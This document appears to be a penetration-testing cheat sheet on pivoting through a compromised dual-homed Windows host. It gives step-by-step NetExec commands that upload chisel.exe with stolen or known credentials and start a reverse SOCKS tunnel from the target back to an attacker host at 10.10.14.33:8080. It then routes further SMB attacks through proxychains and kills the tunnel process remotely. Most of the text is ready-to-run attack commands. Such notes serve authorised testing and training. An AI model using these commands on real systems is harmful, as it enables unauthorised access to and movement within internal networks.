# 06.19 Tunneling with Chisel Proxychains

> Deploy `chisel` via NetExec to a dual-homed host and route all subsequent commands through `proxychains4 -q`.

## Overview

Use CME to deploy chisel to a compromised dual-homed host, then establish a SOCKS tunnel to reach internal networks. Two modes: Linux attack host as server (reverse tunnel, client connects back) or Windows target as server (Linux client connects forward). Route all CME commands through `proxychains4 -q`. Use `-X` (PowerShell) to stop chisel remotely.

## Steps

- Download chisel linux and chisel_windows binaries before starting.
- **Reverse mode (attack host is server):** run `./chisel server --reverse` on attacker, upload chisel.exe via CME, then run chisel client on target with `R:socks`.
- **Forward mode (target is server):** run `chisel.exe server --socks5` on target via CME, then connect with `sudo chisel client <target_IP>:8080 socks` from attacker.
- Configure `/etc/proxychains.conf` with `socks5 127.0.0.1 1080` in the ProxyList section.
- Use `proxychains4 -q nxc smb ...` to suppress proxychains noise.
- Use `proxychains nxc smb <internal_IP> ...` to reach the pivot network.
- Kill chisel remotely with CME `-X "Stop-Process -Name chisel -Force"`.
- Verify tunnel with `netstat -lnpt | grep 1080`.

## Commands

### Start chisel server (attack host, reverse mode)

```bash
./chisel server --reverse
```

### Upload chisel.exe via CME

```bash
nxc smb <TARGET> -u grace -p <PASS> --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
```

### Connect chisel client (reverse tunnel)

```bash
nxc smb <TARGET> -u grace -p <PASS> -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"
```

### Run CME through proxychains

```bash
proxychains4 -q nxc smb <TARGET> -u grace -p <PASS> --shares
```

### Start chisel server on target (forward mode)

```bash
nxc smb <TARGET> -u grace -p <PASS> -x "C:\Windows\Temp\chisel.exe server --socks5"
```

### Connect to target chisel server from attacker

```bash
sudo chisel client <TARGET>:8080 socks
```

### Kill chisel on target

```bash
nxc smb <TARGET> -u grace -p <PASS> -X "Stop-Process -Name chisel -Force"
```
